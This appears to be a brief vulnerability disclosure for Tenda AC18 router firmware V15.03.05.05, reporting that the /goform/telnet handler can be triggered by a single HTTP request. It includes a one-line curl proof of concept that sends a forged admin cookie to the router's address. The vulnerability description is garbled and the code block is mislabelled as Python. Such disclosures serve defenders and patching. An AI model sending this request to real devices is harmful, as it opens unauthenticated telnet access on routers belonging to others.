# TendaAC18v15.03.05.05telnet

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/102610

## Affected version

AC18v1.0 V15.03.05.05

## Vulnerability details

An issue was discovered in AC18v1.0 V15.03.05.05 devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

![1736746414925](/img/1736746414925.png)

## POC

```python
curl -i -X POST http://192.168.1.100/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![1736746378753](/img/1736746378753.png)

